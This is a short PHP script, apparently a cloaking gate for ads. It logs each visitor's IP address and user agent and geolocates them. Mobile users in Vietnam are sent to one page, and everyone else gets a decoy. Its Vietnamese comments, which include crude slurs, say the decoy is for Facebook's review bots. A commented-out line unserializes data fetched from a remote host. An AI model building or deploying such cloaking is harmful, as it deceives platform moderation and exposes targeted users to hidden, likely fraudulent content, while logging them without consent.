<?php
require_once 'Mobile_Detect.php';
$user_ip = getenv('REMOTE_ADDR');

/*$geo = unserialize(file_get_contents("http://www.geoplugin.net/php.gp?ip=$user_ip"));
//$country = $geo["geoplugin_countryName"];
//$city = $geo["geoplugin_city"];
//$ip = $_SERVER['REMOTE_ADDR'];
//$details = json_decode(file_get_contents("http://ipinfo.io/{$user_ip}/json"));*/
function writeLog($logcontent) {
    $date = date("h:i:sA, d/m/Y");  
    $fh = fopen('tracking.log', "a") or die("Could not open log file."); 
    fwrite($fh, date("d-m-Y, H:i")." - $logcontent \r\n") or die("Could not write file!");
    fclose($fh);
}

$link = "https://geoip-db.com/json/".$user_ip;
$json = file_get_contents($link);
$data = json_decode($json);
$country =  $data->country_name; 
//echo $country;
$detect = new Mobile_Detect;
$log = $user_ip.'-'.$_SERVER["HTTP_USER_AGENT"].'-'.$_SERVER["HTTP_USER_AGENT"];
writeLog($log);
if ( $detect->isMobile() && $country=='Vietnam' ) 
{
//echo "Mày dùng mobile và mày là người VN";
require_once 'pre-link.php';
} else {
 // echo "Mày đéo phải người dùng mobile ok hoặc mày là mấy con đĩ lồn bên FB bot";
 require_once 'pre-sach.php';
}
?>